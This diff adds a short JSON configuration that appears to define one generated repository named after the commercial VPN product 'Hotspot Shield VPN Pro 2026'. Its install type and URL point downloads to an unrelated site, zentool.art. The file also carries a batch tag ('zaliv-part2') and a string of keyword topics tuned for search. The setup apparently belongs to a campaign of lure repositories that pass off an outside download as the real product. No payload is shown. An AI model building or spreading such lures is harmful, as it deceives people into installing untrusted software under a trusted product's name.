@@ -1,0 +1,27 @@
+{
+  "repo": "hotspot-shield-vpn-pro-2026",
+  "product": "Hotspot Shield VPN Pro 2026",
+  "kind": "security",
+  "install_type": "zentool",
+  "install_url": "https://zentool.art/",
+  "batch": "zaliv-part2",
+  "format": "license-md-zentool-v1-no-banner",
+  "category": "vpn-client",
+  "topics": [
+    "hotspot-shield-vpn-pro",
+    "hotspot-desktop",
+    "hotspot-windows",
+    "hotspot-2026",
+    "vpn-client",
+    "secure-tunnel",
+    "privacy-protection",
+    "encrypted-traffic",
+    "desktop-vpn",
+    "windows-vpn",
+    "anonymous-browsing",
+    "geo-unblock",
+    "wifi-security",
+    "online-privacy"
+  ],
+  "site": "zentool.art"
+}
